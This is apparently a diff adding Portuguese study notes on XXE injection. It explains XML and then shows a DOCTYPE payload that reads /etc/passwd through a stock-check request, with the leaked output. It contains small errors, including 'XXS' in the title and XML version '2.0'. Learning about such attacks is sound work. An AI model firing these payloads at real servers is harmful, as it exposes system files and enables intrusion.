@@ -1,0 +1,73 @@
+XXS (XML External Entity)
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+-> O QUE É XML?
+    -> é uma linguagem de marcação que trabalha com chave e valor
+        -> <to> Antonio </to>
+           <from> Clara </from>
+    -> um arquivo xml possui um head, que conte, a versao do xml e o tipo de encoding
+    -> temos tb a tag root que seria a tag que guarda o conteúdo principal
+    -> e as demais tags
+    ->
+        <?xml version="2.0" encoding="UTF-8">
+        <note>
+            <to>Antonio</to>
+            <from>Clara</from>
+            <assunto>Reminder</assunto>
+            <body>Don't forget me this weekend!</body>
+        </note>
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+-> EM QUE CONTEXTO É USADO?
+    -> Troca de dados entre sistemas diferentes
+    -> Algumas aplicações web usam arquivos XML para armazenar configurações e preferências do usuário
+    -> Intercâmbio de informações com outros serviços/sites, como integrações de API
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+-> DO QUE SE TRATA XML EXTERNAL ENTITY?
+    -> É sobre colocar uma entidade externa dentro do arquivo XML (ou seja, "adulterar" o seu conteúdo)
+    -> Para que, quando ele for processado, ele retorne dados confidenciais
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+*** XML TESTE ***
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+    <productId>9</productId>
+    <storeId>1</storeId>
+</stockCheck>
+
+PASSOS:
+
+1) Inserir o DOCTYPE dentro do arquivo e cria uma identidade dentro dela (e cria um nome pra ela. ex: fantasma. dps associa um valor à ela (estaremos colocando "9"))
+
+2) Agora, para essa entidade ser lida, se colocar &nome-da-entidade;
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE crowsec [<!ENTITY fantasma "9" >] >
+    <stockCheck>
+        <productId>&fantasma;</productId>
+        <storeId>1</storeId>
+    </stockCheck>
+
+2.2) Ou seja, até agora, é como se eu tivesse criado uma variável e passado dela ao invés de um valor bruto (até agora tudo certo, sem hacking etc)
+
+3) Mas essa entidade/variável "fantasma" pode absorver vários valores, inclusive podemos referenciar algo do "SYSTEM" para ela absorver
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE crowsec [<!ENTITY fantasma SYSTEM '/etc/passwd/' >] >
+    <stockCheck>
+        <productId>&fantasma;</productId>
+        <storeId>1</storeId>
+    </stockCheck>
+
+3.3) Neste caso, estou dizendo que o "fantasma" terá o valor do que tiver na pasta interna do sistema /etc/passwd/
+
+3.4) normalmente usamos <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> mas apenas usamos o /etc/passwd/ pois o xml já entende que é uma busca por arquivos
+
+4) Obviamente, quando esse valor for passado para o outro servidor será renderizado um erro na resposta do servidor, mas com o resultado dessa busca em questão no sistema:
+
+    "Invalid product ID: root:x:0:0:root:/root bla bla bla"
